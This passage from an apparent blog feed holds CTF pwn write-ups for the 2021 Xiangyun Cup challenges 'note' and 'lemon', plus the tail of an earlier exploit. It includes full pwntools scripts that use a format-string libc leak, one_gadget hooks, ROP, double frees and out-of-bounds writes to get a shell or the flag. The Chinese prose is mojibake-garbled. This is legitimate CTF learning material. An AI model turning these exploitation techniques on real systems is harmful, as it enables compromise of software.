class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;content?&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index ?&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;what is your name?&quot;</span>)<br>p.send(<span class="hljs-string">&#x27;sc&#x27;</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1 </span><br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;c&#x27;</span>) <span class="hljs-comment">#2</span><br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span>) <span class="hljs-comment">#3</span><br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c4b78</span> <br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br><br><br><br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">2</span>)<br>heap_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x90</span><br>log.info(<span class="hljs-string">&quot;heap_base==&gt;0x%x&quot;</span> %heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x110</span><br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>pop_rdi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdi\nret&#x27;</span>))) + libc_base<br>pop_rsi = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rsi\nret&#x27;</span>))) + libc_base<br>pop_rdx = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rdx\nret&#x27;</span>))) + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000417</span> + libc_base <br>read = libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>] + libc_base <br>write = libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>] + libc_base<br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(write)<br><br>add(<span class="hljs-number">0xb0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">18</span> + p64(heap_base + <span class="hljs-number">0x240</span>) + p64(ret)) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0xf8</span>,rop) <span class="hljs-comment">#5</span><br><span class="hljs-comment">#add(3,)</span><br>add(<span class="hljs-number">0x60</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>,p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(setcontext))<br>free(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size?&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0xb0</span>))<br><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>2021ç¥¥äº‘æ¯PWN</title>
    <url>/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>ä»¥ä¸‹æ˜¯æˆ‘æ ¹æ®å¤§ä½¬çš„wpä¸€ç‚¹ç‚¹å¤ç°çš„ï¼Œæ¯”èµ›æ—¶ï¼Œå¤ªèœäº†ï¼Œéƒ½æ²¡åšå‡ºæ¥ã€‚ä¸‹é¢ä¸¤ä¸ªé“¾æ¥æ˜¯å¤§ä½¬çš„wp</p>
<p><a href="https://zhuanlan.zhihu.com/p/402722060">https://zhuanlan.zhihu.com/p/402722060</a></p>
<p><a href="https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ">https://mp.weixin.qq.com/s/_jPCp1U9c6EaGa4S2cx2mQ</a></p>
<h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160536437.png" alt="image-20210903160536437"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p>è¿›å…¥IDAçœ‹çœ‹ï¼Œç¨‹åºå¾ˆç®€å•ï¼Œå°±ä¸ç»†è¯´äº†ã€‚ä¸»è¦è¯´ä¸‹æ¼æ´ç‚¹</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903160656584.png" alt="image-20210903160656584"></p>
<p>åœ¨ä¿®æ”¹åŠŸèƒ½å‡½æ•°é‡Œé¢ï¼Œå­˜åœ¨scanf(buf)ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç„¶åè¿™è¾¹çš„è¦å»è®¡ç®—åç§»ï¼Œä¸€å®šè¦å»ç›¸åº”ç‰ˆæœ¬çš„Ubuntuä¸‹å»åŠ¨æ€è°ƒè¯•ï¼Œæˆ‘åˆšå¼€å§‹æ˜¯åœ¨20.04ä¸‹è°ƒè¯•ï¼Œåç§»ä¸å¯¹ã€‚ç„¶åè¿™è¾¹è°ƒè¯•æŠ€å·§ï¼šå› ä¸ºç¨‹åºå¼€pieäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆè¾“å…¥startæŒ‡ä»¤ï¼Œä¼šæ–­åœ¨å¼€å¤´ï¼Œè¿™æ—¶å€™å¯ä»¥è·å–å½“å‰çš„pieï¼Œæ‰èƒ½æ–­ç‚¹åœ¨ç›¸åº”çš„ä½ç½®</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903161041335.png" alt="image-20210903161041335"></p>
<p>å¯ä»¥è®¡ç®—å‡ºåç§»æ˜¯6ï¼Œå¹¶ä¸”åœ¨åº•ä¸‹å°±å­˜åœ¨ç€æ®‹ç•™çš„stdoutæŒ‡é’ˆï¼Œæ­¤æ—¶stdoutæŒ‡é’ˆçš„åç§»æ˜¯7ï¼Œæ‰€ä»¥ç¬¬ä¸€ä¸ªbufå°±æ˜¯<code>%7$s</code>é‚£ä¹ˆå¯ä»¥ä¿®æ”¹stdoutä»è€Œæ³„éœ²libcåœ°å€</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903162610572.png" alt="image-20210903162610572"></p>
<p>åå‡ºäº†ä¸€å¤§å †æ•°æ®ï¼Œæ¥æ”¶å³å¯ã€‚</p>
<p>ç„¶åå»åŠ«æŒexit_hookä¸­çš„_dl_rtld_lock_recursiveä¸ºone_gadgetï¼Œå½“è°ƒç”¨exitå‡½æ•°æ—¶å¯å¾—åˆ°shell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903171325616.png" alt="image-20210903171325616"></p>
<p>è€Œè¦æ‰¾åˆ°è¿™ä¸ªåç§»ï¼Œè¦å»_rtld_globalä¸­å¯»æ‰¾</p>
<p>è®¡ç®—å¯å¾—åç§»ä¸º0x5F0F48</p>
<p>è¿™è¾¹æˆ‘æ˜¯åœ¨æœ¬åœ°è°ƒè¯•çš„ï¼Œæˆ‘æ”¶åˆ°çš„libcçš„è·ç¦»libcåŸºå€çš„åç§»ä¸wpçš„ä¸å¤ªä¸€æ ·ï¼Œæ˜¯ä¸º479552ï¼Œç„¶åå°±æ˜¯å†æ¬¡å€Ÿç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå‰é¢è¯´è¿‡äº†ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²å¤„åœ¨ç¬¬å…­ä¸ªåç§»ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¡«æ»¡å…«ä¸ªå­—èŠ‚ï¼Œç„¶åæŠŠè·å¾—çš„rtld_lockåœ°å€è·Ÿåœ¨åé¢å¡«å…¥ï¼Œå°±å˜ä¸ºç¬¬ä¸ƒä¸ªåç§»ï¼Œä¹‹åå°±èƒ½åœ¨ä¸Šé¢å†™å…¥one_gadgetï¼Œæœ€åæ‰§è¡Œexit(0)getshell</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210903174509942.png" alt="image-20210903174509942"></p>
<p>æˆåŠŸgetshell</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./note&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(argv=[elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:libc.path&#125;)<br><br>def <span class="hljs-builtin-name">debug</span>():<br>	gdb.attach(p)<br>def <span class="hljs-builtin-name">add</span>(size, content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;size:&#x27;</span>, str(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;content:&#x27;</span>, content)<br><br><span class="hljs-builtin-name">add</span>(0x20,<span class="hljs-string">&#x27;a&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(0xfbad1800) + p64(0) * 3 + <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-6:].ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 479552<br><span class="hljs-builtin-name">print</span>(<span class="hljs-string">&quot;libc=&gt;&quot;</span>,hex(libc_base))<br><span class="hljs-builtin-name">debug</span>()<br>ogg = libc_base + 0xf1247<br>rtld_lock = libc_base + 0x5F0F48<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;say ? &#x27;</span>,<span class="hljs-string">&#x27;%7$s\x00&#x27;</span>.ljust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>) + p64(rtld_lock))<br>p.sendlineafter(<span class="hljs-string">&#x27;? &#x27;</span>,p64(ogg))<br>p.sendlineafter(<span class="hljs-string">&#x27;choice:&#x27;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="lemon"><a href="#lemon" class="headerlink" title="lemon"></a>lemon</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907101349756.png" alt="image-20210907101349756"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ64ä½ï¼Œä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908150639102.png" alt="image-20210908150639102"></p>
<p>è¿›å…¥IDAï¼Œå‘ç°æ¼æ´åœ¨ä¿®æ”¹å †å—å†…å®¹çš„åŠŸèƒ½é‡Œï¼Œå› ä¸ºbuf[4]çš„å¤§å°æ˜¯æˆ‘ä»¬è®¾ç½®çš„ï¼Œæœ€å¤§å¯ä¸º0x400ï¼Œæ‰€ä»¥èƒ½äº§ç”Ÿå †æº¢å‡ºï¼ˆè¿™æ˜¯æˆ‘çœ‹å‡ºçš„æ¼æ´åˆ©ç”¨æ–¹æ³•ï¼‰ã€‚ä½†æ˜¯è¿™è¾¹å¤ç°çš„æ˜¯å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼Œåé¢å†æ</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907172951372.png" alt="image-20210907172951372"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210907173047903.png" alt="image-20210907173047903"></p>
<p>è¿™é‡Œæœ‰ä¸ªä¼ªéšæœºæ•°ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“æ€ä¹ˆç»•è¿‡ï¼Œä½†æ˜¯è¯•äº†ä¸€ä¸‹111111ï¼Œå¯ä»¥ç»•è¿‡</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908145856031.png" alt="image-20210908145856031"></p>
<p>flagè¢«ä¿å­˜åœ¨æ ˆä¸Šï¼ŒåŒæ—¶æœ‰ä¸ªæ ˆåœ°å€è¢«ä¿å­˜åœ¨.bssä¸Š</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908144332803.png" alt="image-20210908144332803"></p>
<p>æ³„éœ²å‡ºçš„åœ°å€ï¼Œè·ç¦»flagçš„åœ°å€åç§»ä¸º0x40ï¼Œç„¶åè¿™è¾¹ä¸ºå¯¹é½ï¼Œå†åŠ ä¸Šäº†0x1000ï¼Œå¼„æˆä¸¤å­—èŠ‚åœ°å€</p>
<p>è®¤çœŸè§‚å¯Ÿï¼Œæ‰€æœ‰çš„èœå•åŠŸèƒ½é‡Œé¢éƒ½æ²¡æœ‰æ£€æŸ¥ç´¢å¼•çš„ä¸‹é™ï¼Œåªæ˜¯è§„å®šäº†ä¸èƒ½å¤§äº3ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡å †ç»“æ„çš„æ•°ç»„è¿›è¡Œè¶Šç•Œï¼Œå¯»æ‰¾åˆ°ä¹‹å‰ä¿å­˜åœ¨.bssä¸Šçš„æ ˆåœ°å€ï¼Œå†å€Ÿç”¨ä¿®æ”¹åŠŸèƒ½å¯¹æ ˆç©ºé—´è¿›è¡Œä¿®æ”¹ï¼Œé€šè¿‡éƒ¨åˆ†è¦†ç›–å°†ç¯å¢ƒå˜é‡çš„ä¸€ä¸ªæŒ‡é’ˆæ”¹ä¸ºflagçš„åœ°å€ï¼Œä¹‹åç ´åå †ç»“æ„ï¼ŒæŠ¥é”™å³å¯æ³„éœ²å‡ºflag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151510913.png" alt="image-20210908151510913"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908151525386.png" alt="image-20210908151525386"></p>
<p>è¦è¶Šç•Œåˆ°0x202060ï¼Œä¹Ÿå°±æ˜¯æ•°ç»„ä¸‹æ ‡å€¼ä¸º-260</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908163406979.png" alt="image-20210908163406979"></p>
<p>è¿˜è®°å¾—å‰é¢ç»•è¿‡éšæœºæ•°ï¼Œå¯ä»¥è¾“å…¥çš„åå­—å—ï¼Ÿåˆšå¥½ï¼Œå‰å››ä¸ªå­—èŠ‚ä¼ªé€ sizeï¼Œå•ç‹¬ä¸€ä¸ªå­—èŠ‚èƒ½ä¼ªé€ å †çš„flagï¼Œæ‰€ä»¥æˆ‘ä»¬å°±èƒ½å¯¹.bssä¸Šçš„æ ˆåœ°å€å†™å…¥0x2000é•¿åº¦çš„æ•°æ®</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908164508706.png" alt="image-20210908164508706"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210908165054261.png" alt="image-20210908165054261"></p>
<p>ç›®çš„æ˜¯ä¸ºäº†ä¿®æ”¹æ ˆä¸Šçš„ä¸€ä¸ªç¯å¢ƒæŒ‡é’ˆï¼Œç„¶åæˆ‘å‘ç°ï¼Œwpé‡Œé¢å¹¶æ²¡æœ‰è¦†ç›–åˆ°æˆ‘è¿™çš„ç¯å¢ƒæŒ‡é’ˆï¼Œè¿˜å·®å…«ä¸ªå­—èŠ‚ï¼Œä¿®æ”¹ä¸º<code>&#39;a&#39;*0x140</code>ï¼Œå¦‚ä¸Šå›¾ï¼Œä¿®æ”¹æˆåŠŸäº†</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230006730.png" alt="image-20210909230006730"></p>
<p>ç”±äºæ˜¯æœ¬åœ°è°ƒè¯•ï¼Œæˆ‘ç›´æ¥ä¸çˆ†ç ´äº†ï¼Œè½¬ä¸ºæ‰‹åŠ¨è¾“å…¥ï¼Œæ‰€ä»¥ä¿®æ”¹æˆåŠŸ</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230112342.png" alt="image-20210909230112342"></p>
<p>è¿™é‡Œæ˜¯ä¼ªé€ ä¸€ä¸ªå †å¤´ï¼Œåé¢æ˜¯è¦è®©å †å—ç”³è¯·åˆ°è¿™é‡Œï¼Œä½†æ˜¯å¤§å°å´ä¸æ˜¯0x450ï¼Œå¯¼è‡´æŠ¥é”™é€€å‡ºï¼Œæ‰“å°flag</p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230229164.png" alt="image-20210909230229164"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230215738.png" alt="image-20210909230215738"></p>
<p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210909230529823.png" alt="image-20210909230529823"></p>
<p>è¿™è¾¹å¤šæçš„æ˜¯å› ä¸ºåœ¨ç”³è¯·å †å—åŠŸèƒ½é‡Œé¢ï¼Œå¦‚æœç¬¬äºŒä¸ªå †å—ç”³è¯·å¤§äº0x400ï¼Œå°†ä¼šç›´æ¥freeå‰é¢çš„ï¼Œä½†æ˜¯æŒ‡é’ˆå´æ²¡æœ‰æ¸…é›¶ï¼Œæ‰€ä»¥å€Ÿç”¨è¿™ä¸ªï¼Œå¯ä»¥é€ æˆdouble freeï¼Œæœ€ç»ˆå¯¼è‡´chunk dupï¼Œæ‰€ä»¥å°±å¯ä»¥ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ï¼Œä»è€Œç”³è¯·åˆ°æˆ‘ä»¬å‰é¢å¸ƒç½®å¥½çš„ä¼ªé€ å †å—ä¸Šï¼Œä½†æ˜¯æˆ‘æœ¬åœ°æ˜¯æ²¡æœ‰æ‰“å°å‡ºflagçš„ï¼Œå…·ä½“åŸå› ä¸çŸ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br>elf = ELF(<span class="hljs-string">&quot;./lemon_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/libc-2.26.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.26-0ubuntu2.1_amd64/ld-2.26.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,name,size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;Leave your message:&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add2</span>(<span class="hljs-params">idx,name,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name your lemon:&quot;</span>)<br>	p.send(name)<br>	p.recvuntil(<span class="hljs-string">&quot;length of message for you lemon:&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;4&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon  :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;draw and color!&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;your choice &gt;&gt;&gt; &quot;</span>,<span class="hljs-string">&quot;3&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index of your lemon :&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>	p.sendafter(<span class="hljs-string">&quot;game with me?\n&quot;</span>,<span class="hljs-string">&quot;yes&quot;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;number: \n&quot;</span>,<span class="hljs-string">&#x27;111111&#x27;</span>)<br>	p.sendafter(<span class="hljs-string">&quot;first: \n&quot;</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p32(<span class="hljs-number">0x2000</span>) + p8(<span class="hljs-number">1</span>))<br>	p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>	low = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">3</span>),<span class="hljs-number">16</span>)<br>	log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>	debug()<br>	a = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;æ‰¾åˆ°çˆ†ç ´å­—èŠ‚&quot;</span>) <br>	flag_low = low - <span class="hljs-number">0x40</span> + a<br>	payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x140</span> + p8(flag_low &amp; <span class="hljs-number">0xff</span>) + p8((flag_low &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>) <span class="hljs-comment">##è¦†ç›–ç¯å¢ƒå˜é‡çš„ä½ç½®</span><br>	edit(-<span class="hljs-number">260</span>,payload)<br>	<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	free(<span class="hljs-number">0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;a&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;desh&#x27;</span>,<span class="hljs-number">0x500</span>)<br>	free(<span class="hljs-number">0</span>)<br>	payload = p64(<span class="hljs-number">0x20</span>) + p64(<span class="hljs-number">0x450</span>) + p64(<span class="hljs-number">0x100000020</span>) + p64(<span class="hljs-number">0x0</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\x01\x01&#x27;</span>,<span class="hljs-number">0x20</span>,payload)<br>    free(<span class="hljs-number">0</span>)<br>	free(<span class="hljs-number">1</span>)<br>	add(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>)<br>	add2(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;\xa0&#x27;</span>,<span class="hljs-number">0x20</span>)<br>pwn()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">while True:</span><br><span class="hljs-string">	try:</span><br><span class="hljs-string">		p = process(&quot;./lemon_pwn&quot;)</span><br><span class="hljs-string">		pwn()</span><br><span class="hljs-string">		aaa = (&quot;or corruption (!prev):&quot;)</span><br><span class="hljs-string">		print aaa</span><br><span class="hljs-string">		if &quot;flag&quot; in aaa:</span><br><span class="hljs-string">			pause()</span><br><span class="hljs-string">	except:</span><br><span class="hljs-string">		p.close()</span><br><span class="hljs-string">		continue</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<h2 id="JigSawâ€™sCage"><a href="#JigSawâ€™sCage" class="headerlink" title="JigSawâ€™sCage"></a>JigSawâ€™sCage</h2><p><img src="/2021/09/03/2021-09-03-2021%E7%A5%A5%E4%BA%91%E6%9D%AFPWN/image-20210921090309078.png" alt="image-20210921090309078"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
